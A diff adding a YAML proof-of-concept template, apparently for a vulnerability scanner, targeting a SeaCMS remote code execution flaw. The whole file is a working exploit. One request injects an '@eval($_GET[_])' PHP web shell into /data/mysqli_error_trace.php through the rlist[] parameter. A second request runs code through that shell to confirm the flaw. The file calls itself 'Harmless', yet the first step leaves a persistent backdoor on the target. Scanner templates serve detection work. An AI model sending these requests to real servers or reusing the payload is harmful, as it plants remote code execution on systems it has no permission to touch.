@@ -1,0 +1,25 @@
+name: yaml-poc-seacms-seacms-rce-CT-158384
+binding: 5e05d76d-8732-4476-a446-fd41f95e1296
+detail:
+    author: system_user
+    vulnerability:
+        id: 50ab0036-ab66-4b4c-9536-f6ba1cfeb1b6
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    r1: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /data/mysqli_error_trace.php?_=printf(md5("{{r1}}"))%3B
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(r1)))
+expression: r0() && r1()
